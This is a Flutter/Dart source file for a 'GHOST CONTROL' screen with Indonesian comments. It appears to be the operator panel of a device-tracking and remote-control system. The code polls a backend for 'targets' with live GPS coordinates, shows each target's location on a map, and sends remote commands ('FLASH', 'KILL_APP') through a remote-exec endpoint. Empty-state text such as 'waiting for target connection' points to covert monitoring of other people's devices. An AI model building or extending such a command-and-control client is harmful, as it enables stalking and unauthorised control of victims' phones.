import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:url_launcher/url_launcher.dart';
import 'config_service.dart';

class ControlCenterPage extends StatefulWidget {
  final String sessionKey;
  const ControlCenterPage({super.key, required this.sessionKey});
  @override
  State<ControlCenterPage> createState() => _ControlCenterPageState();
}

class _ControlCenterPageState extends State<ControlCenterPage>
    with SingleTickerProviderStateMixin {
  static const _bg   = Color(0xFF060608);
  static const _card = Color(0xFF0C0E12);
  static const _cyan = Color(0xFF00FFFF);
  static const _red  = Color(0xFFFF3333);
  static const _orb  = 'Orbitron';
  static const _mono = 'ShareTechMono';

  String get _base => baseUrl;
  String get _key  => widget.sessionKey;

  List<dynamic> _targets = [];
  bool _loading = false;
  Timer? _autoRefresh;
  late AnimationController _pulse;

  @override
  void initState() {
    super.initState();
    _pulse = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 2),
    )..repeat(reverse: true);
    _fetchTargets();
    // Auto-refresh setiap 10 detik
    _autoRefresh = Timer.periodic(
      const Duration(seconds: 10),
      (_) => _fetchTargets(),
    );
  }

  @override
  void dispose() {
    _autoRefresh?.cancel();
    _pulse.dispose();
    super.dispose();
  }

  // GET /api/tools/target-list?key=...
  // Hanya return target milik user pemilik key ini
  Future<void> _fetchTargets() async {
    setState(() => _loading = true);
    try {
      final r = await http
          .get(Uri.parse('$_base/api/tools/target-list?key=$_key'))
          .timeout(const Duration(seconds: 15));
      if (r.statusCode == 200) {
        final d = jsonDecode(r.body);
        if (d['status'] == true) {
          setState(() => _targets = d['targets'] ?? []);
        } else {
          _snack(d['message'] ?? 'No data', err: true);
        }
      } else if (r.statusCode == 401) {
        _snack('Session expired, login ulang', err: true);
      } else {
        _snack('Server error: ${r.statusCode}', err: true);
      }
    } catch (e) {
      _snack('Koneksi gagal: $e', err: true);
    } finally {
      setState(() => _loading = false);
    }
  }

  // GET /api/tools/remote-exec?key=...&target=...&action=...
  Future<void> _exec(String targetId, String action) async {
    try {
      final r = await http
          .get(Uri.parse(
            '$_base/api/tools/remote-exec?key=$_key&target=$targetId&action=$action',
          ))
          .timeout(const Duration(seconds: 10));
      final d = jsonDecode(r.body);
      if (r.statusCode == 401) {
        _snack('Session expired, login ulang', err: true);
        return;
      }
      if (r.statusCode == 403) {
        _snack('Target bukan milik akun kamu', err: true);
        return;
      }
      _snack(
        d['status'] == true
            ? '✓ [$action] dikirim ke $targetId'
            : 'Gagal: ${d['message'] ?? 'unknown'}',
        err: d['status'] != true,
      );
    } catch (e) {
      _snack('Exec error: $e', err: true);
    }
  }

  // GET /api/tools/clear-target?key=...&id=...
  Future<void> _clearTarget(String targetId) async {
    try {
      final r = await http
          .get(Uri.parse('$_base/api/tools/clear-target?key=$_key&id=$targetId'))
          .timeout(const Duration(seconds: 10));
      final d = jsonDecode(r.body);
      if (d['status'] == true) {
        setState(() => _targets.removeWhere((t) => t['id'] == targetId));
        _snack('Target $targetId dihapus');
      } else {
        _snack(d['message'] ?? 'Gagal hapus', err: true);
      }
    } catch (e) {
      _snack('Error: $e', err: true);
    }
  }

  Future<void> _openMap(dynamic lat, dynamic lng) async {
    final url = Uri.parse(
      'https://www.google.com/maps/search/?api=1&query=$lat,$lng',
    );
    if (await canLaunchUrl(url)) {
      await launchUrl(url, mode: LaunchMode.externalApplication);
    }
  }

  void _snack(String msg, {bool err = false}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      content: Text(msg,
          style: const TextStyle(fontFamily: _mono, fontSize: 10)),
      backgroundColor:
          err ? _red.withOpacity(0.9) : _cyan.withOpacity(0.85),
      behavior: SnackBarBehavior.floating,
      margin: const EdgeInsets.fromLTRB(12, 0, 12, 12),
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
      duration: const Duration(seconds: 3),
    ));
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _bg,
      body: Stack(children: [
        Container(
          decoration: BoxDecoration(
            gradient: RadialGradient(
              center: Alignment.topCenter,
              radius: 1.2,
              colors: [_cyan.withOpacity(0.04), Colors.black],
            ),
          ),
        ),
        SafeArea(
          child: Column(children: [
            _buildHeader(),
            Expanded(
              child: _loading && _targets.isEmpty
                  ? _buildLoading()
                  : _targets.isEmpty
                      ? _buildEmpty()
                      : RefreshIndicator(
                          color: _cyan,
                          backgroundColor: _card,
                          onRefresh: _fetchTargets,
                          child: ListView.builder(
                            padding: const EdgeInsets.fromLTRB(16, 8, 16, 24),
                            itemCount: _targets.length,
                            itemBuilder: (_, i) =>
                                _buildTargetCard(_targets[i]),
                          ),
                        ),
            ),
          ]),
        ),
      ]),
    );
  }

  Widget _buildHeader() {
    return Container(
      padding: const EdgeInsets.fromLTRB(16, 14, 16, 14),
      decoration: BoxDecoration(
        border: Border(
            bottom: BorderSide(color: _cyan.withOpacity(0.1))),
      ),
      child: Row(children: [
        GestureDetector(
          onTap: () => Navigator.pop(context),
          child: Container(
            width: 36,
            height: 36,
            decoration: BoxDecoration(
              color: _cyan.withOpacity(0.07),
              borderRadius: BorderRadius.circular(10),
              border: Border.all(color: _cyan.withOpacity(0.25)),
            ),
            child: const Icon(Icons.arrow_back_ios_new,
                color: Colors.white54, size: 14),
          ),
        ),
        const SizedBox(width: 14),
        AnimatedBuilder(
          animation: _pulse,
          builder: (_, __) => Container(
            width: 36,
            height: 36,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              color: _cyan.withOpacity(0.08),
              border: Border.all(
                color: _cyan.withOpacity(0.2 + _pulse.value * 0.3),
              ),
              boxShadow: [
                BoxShadow(
                  color: _cyan.withOpacity(0.05 + _pulse.value * 0.15),
                  blurRadius: 12,
                )
              ],
            ),
            child: Center(
              child: Text('◈',
                  style: TextStyle(
                    fontSize: 18,
                    color: _cyan.withOpacity(0.7 + _pulse.value * 0.3),
                  )),
            ),
          ),
        ),
        const SizedBox(width: 12),
        Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          const Text('GHOST CONTROL',
              style: TextStyle(
                fontFamily: _orb,
                fontSize: 13,
                color: Colors.white,
                letterSpacing: 2,
                shadows: [Shadow(color: Color(0xFF00FFFF), blurRadius: 8)],
              )),
          Text(
            '${_targets.length} target aktif',
            style: TextStyle(
              fontFamily: _mono,
              fontSize: 9,
              color: _targets.isEmpty
                  ? Colors.white24
                  : _cyan.withOpacity(0.7),
            ),
          ),
        ]),
        const Spacer(),
        // Indikator auto-refresh
        if (_loading)
          SizedBox(
            width: 16,
            height: 16,
            child: CircularProgressIndicator(
                color: _cyan.withOpacity(0.5), strokeWidth: 1.2),
          ),
        const SizedBox(width: 8),
        GestureDetector(
          onTap: _fetchTargets,
          child: Container(
            width: 36,
            height: 36,
            decoration: BoxDecoration(
              color: _cyan.withOpacity(0.07),
              borderRadius: BorderRadius.circular(10),
              border: Border.all(color: _cyan.withOpacity(0.25)),
            ),
            child: const Icon(Icons.refresh_rounded,
                color: Colors.white54, size: 18),
          ),
        ),
      ]),
    );
  }

  Widget _buildLoading() {
    return Center(
      child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
        SizedBox(
          width: 36,
          height: 36,
          child: CircularProgressIndicator(color: _cyan, strokeWidth: 1.5),
        ),
        const SizedBox(height: 14),
        const Text('SCANNING NETWORK...',
            style: TextStyle(
              fontFamily: _mono,
              fontSize: 10,
              color: Colors.white24,
              letterSpacing: 2,
            )),
      ]),
    );
  }

  Widget _buildEmpty() {
    return Center(
      child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
        Text('◎',
            style: TextStyle(
                fontSize: 52, color: Colors.white.withOpacity(0.07))),
        const SizedBox(height: 14),
        Text('NO TARGETS DETECTED',
            style: TextStyle(
              fontFamily: _mono,
              fontSize: 10,
              color: Colors.white.withOpacity(0.2),
              letterSpacing: 2,
            )),
        const SizedBox(height: 6),
        Text('Menunggu koneksi target...',
            style: TextStyle(
              fontFamily: _mono,
              fontSize: 9,
              color: Colors.white.withOpacity(0.12),
            )),
        const SizedBox(height: 20),
        GestureDetector(
          onTap: _fetchTargets,
          child: Container(
            padding:
                const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
            decoration: BoxDecoration(
              color: _cyan.withOpacity(0.07),
              borderRadius: BorderRadius.circular(10),
              border: Border.all(color: _cyan.withOpacity(0.3)),
            ),
            child: Text('REFRESH',
                style: TextStyle(
                  fontFamily: _mono,
                  fontSize: 10,
                  color: _cyan.withOpacity(0.8),
                  letterSpacing: 2,
                )),
          ),
        ),
      ]),
    );
  }

  Widget _buildTargetCard(Map<String, dynamic> t) {
    final id       = t['id']       ?? 'UNKNOWN';
    final lat      = t['lat']      ?? '0.0';
    final lng      = t['lng']      ?? '0.0';
    final lastSeen = t['lastSeen'] ?? '';

    String timeAgo = '';
    if (lastSeen.isNotEmpty) {
      try {
        final dt   = DateTime.parse(lastSeen.toString()).toLocal();
        final diff = DateTime.now().difference(dt);
        if (diff.inSeconds < 60)      timeAgo = '${diff.inSeconds}s ago';
        else if (diff.inMinutes < 60) timeAgo = '${diff.inMinutes}m ago';
        else                          timeAgo = '${diff.inHours}h ago';
      } catch (_) {}
    }

    return Dismissible(
      key: Key(id),
      direction: DismissDirection.endToStart,
      background: Container(
        alignment: Alignment.centerRight,
        padding: const EdgeInsets.only(right: 20),
        decoration: BoxDecoration(
          color: _red.withOpacity(0.15),
          borderRadius: BorderRadius.circular(14),
        ),
        child: Icon(Icons.delete_outline, color: _red),
      ),
      onDismissed: (_) => _clearTarget(id),
      child: Container(
        margin: const EdgeInsets.only(bottom: 12),
        padding: const EdgeInsets.all(14),
        decoration: BoxDecoration(
          color: _card,
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: _cyan.withOpacity(0.18)),
          boxShadow: [
            BoxShadow(color: _cyan.withOpacity(0.04), blurRadius: 12)
          ],
        ),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            // Header row
            Row(children: [
              Text('◈',
                  style: TextStyle(
                      fontSize: 16, color: _cyan.withOpacity(0.9))),
              const SizedBox(width: 10),
              Expanded(
                child: Text(id,
                    style: const TextStyle(
                      fontFamily: _mono,
                      fontSize: 12,
                      color: Colors.white,
                      fontWeight: FontWeight.bold,
                    )),
              ),
              if (timeAgo.isNotEmpty)
                Text(timeAgo,
                    style: const TextStyle(
                        fontFamily: _mono,
                        fontSize: 8,
                        color: Colors.white38)),
              const SizedBox(width: 8),
              Container(
                width: 7,
                height: 7,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  color: Colors.greenAccent,
                  boxShadow: [
                    BoxShadow(color: Colors.greenAccent, blurRadius: 4)
                  ],
                ),
              ),
              const SizedBox(width: 6),
              const Text('LIVE',
                  style: TextStyle(
                      fontFamily: _mono,
                      fontSize: 8,
                      color: Colors.greenAccent)),
            ]),

            const SizedBox(height: 10),
            Container(height: 1, color: Colors.white.withOpacity(0.05)),
            const SizedBox(height: 10),

            // Koordinat
            Row(children: [
              Icon(Icons.location_on_rounded,
                  color: _cyan.withOpacity(0.6), size: 12),
              const SizedBox(width: 6),
              Expanded(
                child: Text('$lat, $lng',
                    style: TextStyle(
                      fontFamily: _mono,
                      fontSize: 11,
                      color: _cyan.withOpacity(0.85),
                    )),
              ),
            ]),

            const SizedBox(height: 12),

            // Tombol aksi
            Row(children: [
              Expanded(child: _execBtn('⌖  TRACK', Colors.blue,
                  () => _openMap(lat, lng))),
              const SizedBox(width: 6),
              Expanded(child: _execBtn('⚡  FLASH', Colors.orange,
                  () => _exec(id, 'FLASH'))),
              const SizedBox(width: 6),
              Expanded(child: _execBtn('☠  KILL', _red,
                  () => _exec(id, 'KILL_APP'))),
            ]),
          ],
        ),
      ),
    );
  }

  Widget _execBtn(String label, Color color, VoidCallback onTap) =>
      GestureDetector(
        onTap: onTap,
        child: Container(
          padding: const EdgeInsets.symmetric(vertical: 8),
          decoration: BoxDecoration(
            color: color.withOpacity(0.08),
            borderRadius: BorderRadius.circular(8),
            border: Border.all(color: color.withOpacity(0.35)),
          ),
          child: Center(
            child: Text(label,
                style: TextStyle(
                  fontFamily: _mono,
                  fontSize: 9,
                  color: color,
                  letterSpacing: 0.5,
                )),
          ),
        ),
      );
}
